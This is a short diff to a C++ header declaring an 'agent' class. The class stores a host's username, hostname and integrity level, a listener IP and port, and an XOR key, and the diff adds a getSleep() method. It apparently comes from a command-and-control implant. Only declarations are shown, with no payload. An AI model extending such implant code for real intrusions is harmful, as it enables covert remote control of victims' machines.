@@ -13,7 +13,7 @@ class agent {
     systeminfo systeminfo;
     std::string username {systeminfo.getUsername()};
     std::string hostname {systeminfo.getHostname()};
-    std::string privilege;
+    std::string privilege {systeminfo.getIntegrity()};
     std::string listenerip {LISTENERIP};
     unsigned int listenerport {LISTENERPORT};
     std::string xorkey {XORKEY};
@@ -26,6 +26,7 @@ public:
     std::string getPrivilege();
     std::string getip();
     unsigned int getport();
+    unsigned int getSleep();
 
 };
 
